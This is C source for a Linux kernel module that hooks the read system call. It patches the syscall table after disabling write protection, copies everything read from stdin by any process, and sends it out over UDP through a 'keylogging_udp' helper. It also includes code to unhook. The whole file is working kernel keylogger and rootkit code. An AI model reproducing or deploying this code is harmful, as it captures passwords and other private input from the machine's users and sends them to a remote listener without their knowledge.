#include<linux/kernel.h>
#include<linux/syscalls.h>
#include<linux/unistd.h>
#include<linux/types.h>
#include<linux/slab.h>
#include<linux/string.h>
#include<linux/list.h>
#include<linux/sched.h>
#include<linux/fs.h>
#include<linux/fdtable.h>
#include<linux/dcache.h>
#include<linux/hash.h>
#include<linux/delay.h>
#include<linux/spinlock_types.h>

#include "read_hooking.h"
#include "hooking.h"
#include "keylogging_udp.h"

#define INPUTBUFLEN 1024  //This was arbitrarily chosen to be huge


char buffer[INPUTBUFLEN];

ssize_t (*orig_sys_read)(int fd, void * buf, size_t count);
int r_count=0;



static ssize_t my_read_simple(int fd, void *buf, size_t count){
	ssize_t retVal;
	r_count++;
	retVal = orig_sys_read(fd, buf, count);
  if(retVal <= 0 || count <= 0){
    r_count --;
    return retVal;
  }
	if(fd == 0){ //stdin
		while(count >= INPUTBUFLEN){
			strncpy(buffer, (char*)buf, INPUTBUFLEN-1);
			buffer[INPUTBUFLEN-1] = '\0';
      send_udp(current->pid, buffer);
      count-= (INPUTBUFLEN -1);
      buf = buf + (INPUTBUFLEN -1);
		}
		strncpy(buffer, (char*)buf, count);
		buffer[count] = '\0';
    send_udp(current->pid, buffer);
	}
	r_count--;
	return retVal;
}

void hook_read(void ** syscall_table){
  disable_wp();
  orig_sys_read = syscall_table[__NR_read];
  syscall_table[__NR_read] = my_read_simple;
  enable_wp();
}

void unhook_read(void ** syscall_table){
  disable_wp();
  syscall_table[__NR_read] = orig_sys_read;
  enable_wp();

  send_udp(current->pid, "Unhook read!");
  while(r_count>0){// hack to unblock read
    printk(KERN_INFO "\n");
    msleep_interruptible(100);
  }
}

